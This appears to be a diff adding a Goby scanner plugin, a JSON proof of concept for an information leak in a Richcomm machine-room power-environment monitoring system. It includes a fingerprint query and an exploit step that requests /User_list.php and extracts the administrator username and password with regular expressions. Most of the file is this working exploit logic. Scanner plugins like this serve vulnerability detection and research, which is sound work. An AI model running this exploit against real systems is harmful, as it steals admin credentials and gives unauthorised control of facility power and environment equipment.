@@ -1,0 +1,108 @@
+{
+      "Name": "Micro module monitoring system User_list.php information leakage",
+      "Level": "1",
+      "Tags": [
+            "infoleak"
+      ],
+      "GobyQuery": "title=\"微模块机房动力环境监控系统\"",
+      "Description": "Information is leaked in the power environment monitoring system of the micro-module equipment room, and the administrator account password is leaked  ",
+      "Product": "Monitoring system of power environment in micro-module machine room",
+      "Homepage": "http://www.richcomm.com.cn",
+      "Author": "luckying1314@139.com",
+      "Impact": "<p>The password of the account is disclosed, so that the attacker can log in to the background for operation<br></p>",
+      "Recommendation": "<p>Hide or encrypt sensitive information<br></p>",
+      "References": [
+            "https://gobies.org/"
+      ],
+      "HasExp": true,
+      "ExpParams": null,
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/User_list.php",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "id=\"password1\"",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "id=\"password2\"",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/User_list.php",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "id=\"password1\"",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "user1|lastbody|regex|id=\"user1\" value=\"(.*)\" />",
+                        "password1|lastbody|regex|id=\"password1\" value=\"(.*)\" />",
+                        "output|define|text|Username:{{{user1}}}|Passowrd:{{{password1}}}"
+                  ]
+            }
+      ],
+      "PostTime": "2021-09-04 17:15:16",
+      "GobyVersion": "1.8.300"
+}
